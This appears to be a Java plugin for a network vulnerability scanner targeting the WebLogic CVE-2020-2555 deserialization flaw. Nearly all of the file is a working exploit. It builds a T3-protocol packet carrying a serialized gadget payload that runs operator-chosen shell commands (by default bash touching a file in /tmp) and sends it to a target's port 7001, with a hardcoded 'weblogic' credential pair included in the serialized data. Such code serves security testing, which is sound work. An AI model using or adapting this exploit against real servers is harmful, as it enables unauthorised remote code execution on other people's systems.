package com.gbw.scanner.plugins.scripts.weblogic.CVE20202555;

import com.gbw.scanner.Host;
import com.gbw.scanner.connection.Connection;
import com.gbw.scanner.connection.GBWConnection;
import com.gbw.scanner.connection.SSLSocketClient;
import com.gbw.scanner.connection.SocketClient;
import com.gbw.scanner.plugins.scripts.GBWScanScript;
import com.gbw.scanner.plugins.scripts.GBWScanScriptCommonConfig;
import com.gbw.scanner.plugins.scripts.GBWScanScriptTool;
import com.gbw.scanner.plugins.scripts.weblogic.serial.Serializables;
import com.gbw.scanner.sink.SinkQueue;
import com.gbw.scanner.utils.ByteDataUtils;
import com.gbw.scanner.utils.FileUtils;
import com.gbw.scanner.utils.ProcessUtils;
import com.gbw.scanner.utils.SSLUtils;
import com.xmap.api.utils.TextUtils;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.Options;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import weblogic.rjvm.JVMID;
import weblogic.security.acl.internal.AuthenticatedUser;

import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;

public class GBWScanCVE20202555Script implements GBWScanScript {

    private static final Logger log = LoggerFactory.getLogger(GBWScanCVE20202555Script.class);
    private GBWScanCVE20202555Config config;
    private List<PayloadEntry> payloadEntries;
    private PayloadEntry defaultPayload;

    public GBWScanCVE20202555Script(GBWScanCVE20202555Config config) throws Exception {

        this.config = config;
        this.payloadEntries = new ArrayList<>();
        this.defaultPayload = null;

        if(config.getVersions()!=null&&config.getVersions().length>0) {

            init();
        }

    }

    public void init() throws Exception{

        for (String version : config.getVersions()) {

            PayloadEntry payloadEntry = new PayloadEntry(version, makePayload(version));
            payloadEntries.add(payloadEntry);

            if (!TextUtils.isEmpty(config.getDefaultVersion()) && version.equals(config.getDefaultVersion()))
                defaultPayload = payloadEntry;
        }
    }

    private byte[] makePayload(String version) throws IOException {

        String cmdPath = String.format("%s/%s/run",config.getPayloadScriptDir(),version);
        String filePath = String.format("/opt/data/weblogic_%s.data",version);

        String[] cmds = new String[4];

        cmds[0] = "/bin/bash";
        cmds[1] = cmdPath;
        cmds[2] = filePath;
        StringBuffer rcmd = new StringBuffer();
        String[] cmdArr = config.getCmds();

        for(int i = 0;i<cmdArr.length;i++){

            rcmd.append(cmdArr[i]);
            if(i!=cmdArr.length-1)
                rcmd.append(",");
        }

        cmds[3] = rcmd.toString();

        String proc = ProcessUtils.executeCommand(cmds);

        if(!TextUtils.isEmpty(proc))
            log.info(String.format("Make weblogic payload for version:%s,path:%s,proc:%s",version,filePath,proc));
        else
            proc = "none";

        if(!FileUtils.hasContent(filePath)){

            log.error(String.format("Make weblogic payload for version:%s,path:%s,proc:%s failed!",version,filePath,proc));
            throw new IOException("make weblogic payload failed!");
        }

        return Files.readAllBytes(Paths.get(filePath));
    }

    private class PayloadEntry{

        private String version;
        private byte[] payload;

        public PayloadEntry(String version,byte[] payload){

            this.version = version;
            this.payload = payload;
        }

        public String getVersion() {
            return version;
        }

        public void setVersion(String version) {
            this.version = version;
        }

        public byte[] getPayload() {
            return payload;
        }

        public void setPayload(byte[] payload) {
            this.payload = payload;
        }
    };

    @Override
    public GBWScanScriptCommonConfig getConfig() {
        return config;
    }

    @Override
    public boolean isAccept(Host host) {
        return true;
    }



    private byte[] makeT3ProtoPayload(byte[] payload) throws Exception{

        //cmd=1,QOS=1,flags=1,responseId=4,invokableId=4,abbrevOffset=4,countLength=1,capacityLength=1
        //t3 protocol
        String cmd = "08";
        String qos = "65";
        String flags = "01";
        String responseId = "ffffffff";
        String invokableId = "ffffffff";
        String abbrevOffset = "00000000";
        String countLength = "01";
        String capacityLength = "10";//必须大于上面设置的AS值
        String readObjectType = "00";//00 object deserial 01 ascii

        StringBuilder datas = new StringBuilder();
        datas.append(cmd);
        datas.append(qos);
        datas.append(flags);
        datas.append(responseId);
        datas.append(invokableId);
        datas.append(abbrevOffset);

        //because of 2 times deserial
        countLength = "04";
        datas.append(countLength);

        //define execute operation
        String pahse1Str = ByteDataUtils.toHex(payload);
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(pahse1Str);

        //for compatiable fo hide
        //for compatiable fo hide
        AuthenticatedUser authenticatedUser = new AuthenticatedUser("weblogic", "admin@1234");
        String phase4 = ByteDataUtils.toHex(Serializables.serialize(authenticatedUser));
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(phase4);

        JVMID src = new JVMID();

        Constructor constructor = JVMID.class.getDeclaredConstructor(InetAddress.class,boolean.class);
        constructor.setAccessible(true);
        src = (JVMID)constructor.newInstance(InetAddress.getByName("127.0.0.1"),false);
        Field serverName = src.getClass().getDeclaredField("differentiator");
        serverName.setAccessible(true);
        serverName.set(src,1);

        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(ByteDataUtils.toHex(Serializables.serialize(src)));

        JVMID dst = new JVMID();

        constructor = JVMID.class.getDeclaredConstructor(InetAddress.class,boolean.class);
        constructor.setAccessible(true);
        src = (JVMID)constructor.newInstance(InetAddress.getByName("127.0.0.1"),false);
        serverName = src.getClass().getDeclaredField("differentiator");
        serverName.setAccessible(true);
        serverName.set(dst,1);
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(ByteDataUtils.toHex(Serializables.serialize(dst)));

        byte[] headers = ByteDataUtils.parseHex(datas.toString());
        int len = headers.length + 4;
        String hexLen = Integer.toHexString(len);
        StringBuilder dataLen = new StringBuilder();

        if (hexLen.length() < 8) {
            for (int i = 0; i < (8 - hexLen.length()); i++) {
                dataLen.append("0");
            }
        }

        dataLen.append(hexLen);
        return ByteDataUtils.parseHex(dataLen + datas.toString());
    }

    private Connection makeConnection(Host host){

        String proto = host.getProto();
        boolean isSSL = false;

        if(!TextUtils.isEmpty(proto))
            isSSL = proto.equalsIgnoreCase("t3s");

        SocketClient socketClient;
        if(isSSL){

            socketClient = new SSLSocketClient(true, SSLUtils.createSSLContext());
        }else{
            socketClient = new SocketClient();
        }

        try {
            socketClient.setDefaultTimeout(config.getConTimeout());
            socketClient.setConnectTimeout(config.getConTimeout());
            socketClient.connect(host.getHost(),host.getPort());
            socketClient.setSoTimeout(config.getReadTimeout());
        } catch (Exception e) {
            return null;
        }

        Connection connection = new GBWConnection(socketClient);

        return connection;
    }

    private String sendT3Header(Connection connection,Host host) throws IOException {

        String proto = host.getProto();
        String header = String.format("%s 7.0.0.0\nAS:10\nHL:19\n\n",TextUtils.isEmpty(proto)?"t3":proto);

        connection.send(header.getBytes());
        String version = connection.readLine();

      //  System.out.println(version);
        if(TextUtils.isEmpty(version)||!version.contains("HELO:"))
            return null;
        return version.replace("HELO:","").replace(".false","").replace(".true","");
    }

    private  byte[] findPayload(String version){

        String nversion = version.replace(".","");

        for(PayloadEntry entry:payloadEntries){

            if(nversion.contains(entry.version)){

                log.info(String.format("Find a weblogic payload for version:%s",version));
                return entry.getPayload();
            }
        }

        if(defaultPayload!=null) {
            log.info(String.format("use default payload version:%s for version:%s",defaultPayload.getVersion(),version));
            return defaultPayload.getPayload();
        }

        return null;
    }

    @Override
    public void scan(Host host, SinkQueue sinkQueue) {

        String version = null;
        Connection connection = makeConnection(host);
        byte[] recvData = new byte[512];

        if(connection == null)
            return;

        try{
            /*send t3 header and get version*/
            version = sendT3Header(connection,host);
            if(!TextUtils.isEmpty(version)){
                /*make attack payload*/

                byte[] payload = findPayload(version);

                if(payload!=null) {

                    byte[] attackData = makeT3ProtoPayload(payload);

                    /*send attack payload*/
                    connection.send(attackData);
                    connection.read(recvData);

                    //System.out.println(new String(recvData));
                    /*ok*/
                    GBWScanCVE20202555Result result = new GBWScanCVE20202555Result(config, host);

                    log.warn(String.format("Found a weblogic bugs CVE_2020_2555,in ip:%s,port:%d,version:%s", host.getHost(), host.getPort(), version));

                    result.setVersion(version);
                    result.setCmds(config.getCmds());
                    if (sinkQueue != null)
                        sinkQueue.put(result);
                    else
                        System.out.println(String.format("Found a weblogic bugs CVE_2020_2555,in ip:%s,port:%d,version:%s", host.getHost(), host.getPort(), version));
                }
            }
        }catch (Exception e){

            e.printStackTrace();
        }finally {
            try {
                connection.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private static void runMain(String[] args) throws Exception {

        String payloadDir = "/opt/scan/GBWScanner/weblogic/";
        String defaultVersion = "12130";
        String[] versions = new String[]{"12130","12213","12214"};
        String[] cmds = new String[]{"/bin/bash","-c","touch /tmp/test.data"};

        Options opts = new Options();
        GBWScanCVE20202555Config config = new GBWScanCVE20202555Config();

        opts.addOption("cmd",true,"weblogic run cmds</bin/bash,-c,touch /tmp/test.data>");
        opts.addOption("dir",true,"weblogic payload dir");
        opts.addOption("versions",true,"weblogic versions:<xxx,vvv,....>");
        opts.addOption("dversion",true,"weblogic default version");

        GBWScanCVE20202555Script scanCVE20202555Script = new GBWScanCVE20202555Script(config);

        GBWScanScriptTool tool = new GBWScanScriptTool(args,scanCVE20202555Script,opts,7001);

        CommandLine cli = tool.getCliParser();

        if(cli.hasOption("cmd")){
             cmds = cli.getOptionValue("cmd").split(",");
        }

        if(cli.hasOption("dir"))
            payloadDir = cli.getOptionValue("dir");

        if(cli.hasOption("versions"))
            versions = cli.getOptionValue("versions").split(",");

        if(cli.hasOption("dversion"))
            defaultVersion = cli.getOptionValue("dversion");

        config.setPayloadScriptDir(payloadDir);
        config.setVersions(versions);
        config.setDefaultVersion(defaultVersion);
        config.setCmds(cmds);

        scanCVE20202555Script.init();

        tool.start();
    }

    public static void main(String[] args) throws Exception {

        runMain(args);
    }

}
